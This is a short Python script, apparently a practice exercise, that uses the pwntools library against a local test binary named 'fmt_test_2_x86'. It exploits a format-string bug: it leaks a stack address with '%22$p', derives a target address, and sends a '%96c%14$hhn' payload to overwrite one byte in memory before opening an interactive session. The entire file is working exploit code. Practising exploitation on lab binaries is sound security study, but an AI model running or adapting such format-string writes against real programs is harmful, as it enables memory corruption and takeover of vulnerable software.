from pwn import *
import duchao_pwn_script
context(log_level='debug',arch='amd64', os='linux')
pwnfile= './fmt_test_2_x86'
io = process(pwnfile)
#io = remote('', )
elf = ELF(pwnfile)
rop = ROP(pwnfile)


io.recvline()

payload_search_stack = b'%22$p'
io.sendline(payload_search_stack)

stack_1 = int(io.recv()[2:10],16)
test3_addr = stack_1 - 0x20
print("stack_1 is :" , hex(stack_1))

payload = p32(test3_addr) +b'%96c%14$hhn' 

duchao_pwn_script.dbg(io)
io.send(payload)
pause()

io.interactive()
